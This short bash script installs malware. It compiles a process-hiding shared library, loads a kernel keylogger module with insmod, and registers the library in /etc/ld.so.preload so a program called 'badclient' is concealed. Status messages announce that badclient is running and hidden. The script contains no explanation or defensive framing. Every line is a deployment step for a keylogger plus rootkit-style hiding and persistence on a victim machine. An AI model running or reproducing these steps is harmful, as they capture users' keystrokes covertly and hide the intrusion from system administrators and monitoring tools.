#!/bin/bash

cd /home/badguy/victim

make

gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl

sudo insmod keylogger.ko

echo "[+] badclient is running"

sudo cp libprocesshider.so /usr/local/lib/

sudo sh -c 'echo /usr/local/lib/libprocesshider.so > /etc/ld.so.preload'

echo "[+] badclient is hidden"